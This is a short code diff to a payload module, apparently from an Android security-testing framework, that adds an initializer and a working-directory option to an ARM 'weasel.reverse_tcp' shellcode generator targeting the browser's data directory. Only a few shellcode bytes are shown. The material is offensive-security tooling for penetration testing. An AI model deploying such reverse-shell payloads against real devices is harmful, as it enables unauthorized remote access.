@@ -30,6 +30,14 @@ class ARMEABI(Module, common.ShellCode):
     module_type = "payload"
     path = ["weasel.reverse_tcp"]
     
+    def __init__(self, session, loader):
+        Module.__init__(self, session)
+        
+        self.__loader = loader
+    
+    def add_arguments(self, parser):
+        parser.add_argument("--working-directory", default="/data/data/com.android.browser", help="specify the directory that weasel will execute in")
+    
     def generate(self, arguments):
         self.append([# Switch to THUMB mode for more compact shellcode
                      0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
